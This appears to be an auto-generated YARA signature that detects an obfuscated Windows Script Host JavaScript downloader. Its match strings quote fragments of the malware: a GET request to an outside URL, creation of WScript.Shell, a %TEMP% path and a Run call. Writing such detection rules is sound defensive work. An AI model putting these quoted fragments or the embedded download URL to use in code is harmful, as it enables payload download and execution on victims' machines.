rule sig_20160427_9be042354ee30e7190fd2ff1c49f1375 {
  meta:
    description = "datamaliciousorder - file 20160427_9be042354ee30e7190fd2ff1c49f1375.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b2f5dedfbbc815ca95a28ee864a8af12e6b0f0e0e08a02792304b13b02062c31"

  strings:
    $s1  = "UniuvLanzd[GtpafTahxt](\"G\" + \"ET\", \"http://haraccountants.co.uk/k9sjf\", false);" fullword ascii
    $s2  = "function HoajdOveft() {return VwphyXcvld[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"jqHlx7x" ascii
    $s3  = "function HoajdOveft() {return VwphyXcvld[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"jqHlx7x" ascii
    $s4  = "function QglqxNczyo(EfstuPsyhu, PtwsoPheoj){YsfnjTjdlw = YsfnjTjdlw * 1; return EfstuPsyhu - PtwsoPheoj;};" fullword ascii
    $s5  = "var VwphyXcvld = function OffroEmijs() {return DpbnqQcaov[UzoswVzrpb](\"WScript\"+\".Shell\");}(), NmrstHmwfc = 11;" fullword ascii
    $s6  = "if (UniuvLanzd[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s7  = "function PnldiNbjzj(){return TmzrhMulcz + \"\";};" fullword ascii
    $s8  = "function WjxifYjome() {return ((ZdkwoKhvfp == true) && (ZdkwoKhvfp == SfvibGphfh)) ? 1 : YsfnjTjdlw;};" fullword ascii
    $s9  = "var DpbnqQcaov = this[\"WScript\"];" fullword ascii
    $s10 = "}while (OwcfpJypbb);" fullword ascii
    $s11 = "var WfcmuCxcjf = false;" fullword ascii
    $s12 = "var SfvibGphfh = false;" fullword ascii
    $s13 = "SfvibGphfh = true; " fullword ascii
    $s14 = "function MjtilRmtiw(){return 23;};" fullword ascii
    $s15 = "return QglqxNczyo(AyivgNhdez, NwejpVdvbl);" fullword ascii
    $s16 = "var ZdkwoKhvfp = false;" fullword ascii
    $s17 = "function BdvtpRydje()" fullword ascii
    $s18 = "WfcmuCxcjf = true;" fullword ascii
    $s19 = "function PxtxiPymii(){return UzoswVzrpb;};" fullword ascii
    $s20 = "function MuxbwBmlns(SgrgoWvrgk){VwphyXcvld[\"R\"+\"un\"](SgrgoWvrgk, YsfnjTjdlw, YsfnjTjdlw);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}